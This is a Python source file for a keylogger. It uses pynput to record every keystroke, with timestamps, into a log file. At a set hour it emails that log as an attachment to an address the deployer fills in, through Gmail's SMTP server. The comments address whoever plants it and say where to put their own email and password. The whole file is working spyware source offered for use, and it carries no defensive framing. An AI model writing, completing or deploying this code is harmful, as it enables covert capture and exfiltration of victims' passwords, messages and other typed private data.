# import modules
import datetime
import logging
import smtplib
import threading
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Listener

def send_mail():
    # Back structure to publish emails
    #user credentials
    fromaddr = "email sending info from" #your email
    toaddr = "email sending info to"     #recipient of email
    subject = "subject message"     #what ever you want the subject of the email to be...
    #builds up the email
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    body = "Logging has commenced!"  #<---- whatever message you want here...
    # attach as a mime text part
    msg.attach(MIMEText(body, "plain"))

    #open file to be sent
    log_file = r"full path of file you want the logs saved to"   #<-----only tried in .txt file
    attachment = open(log_file, "rb")
    #allows you to upload an attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload((attachment).read())
    #upload it in base 64
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename= " + log_file)

    #attach to overall message

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(fromaddr, "password")  # <-----input a password here

    server.sendmail(fromaddr, toaddr, text)
    server.quit()
# if no name it gets put into an empty string
log_dir = " "

########## this is the basic logging function###########
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format ='%(asctime)s: %(message)s:')
# library

def on_press(key):
    logging.info(str(key))
    # if key == Key.esc:
        # return false

#setting datetime to identify current time and associate it with the set time variable

with Listener(on_press=on_press) as listener:
    while True:
        currentTimeOfDay = datetime.datetime.now()
        currentHour = currentTimeOfDay.hour
        sethour = 20   #changes the time the email sends (24-hour clock) currently at 9:00
        if currentHour == sethour:
            send_mail()
            break
    listener.join()
